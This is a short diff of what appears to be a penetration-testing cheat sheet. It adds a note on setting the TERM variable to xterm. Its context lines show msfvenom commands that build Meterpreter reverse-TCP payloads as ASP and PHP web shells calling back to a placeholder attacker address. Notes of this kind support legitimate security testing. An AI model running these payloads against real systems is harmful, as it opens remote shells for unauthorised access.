@@ -144,6 +144,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Porta> -f asp > sh
 PHP
 msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Porta> -f raw -o shell.php
 
+-- TERM
+set | grep TERM
+export TERM=xterm
+
 
 
 
